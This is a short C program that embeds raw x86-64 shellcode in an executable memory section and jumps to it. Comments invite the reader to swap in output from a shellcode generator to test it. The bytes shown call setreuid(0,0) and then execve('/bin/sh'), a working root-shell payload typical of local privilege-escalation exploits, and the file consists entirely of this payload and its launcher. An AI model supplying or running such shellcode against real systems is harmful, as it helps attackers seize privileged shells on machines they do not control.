char shellcode[] __attribute__((section(".test,\"awx\",@progbits#")))= //Replace the following shellcode with that one 
"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31"                         //generated from shellcoder to test if it works
"\xd2\xb0\x71\x0f\x05\x48\x31\xc0\xeb\x0f\x5f"
"\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0" 
"\x3b\x0f\x05\xe8\xec\xff\xff\xff\x2f\x62\x69"
"\x6e\x2f\x73\x68";

int main(int argc, char **argv)

{

int (*func)();

func = (int (*)()) shellcode;

(int)(*func)();

return 0;

}
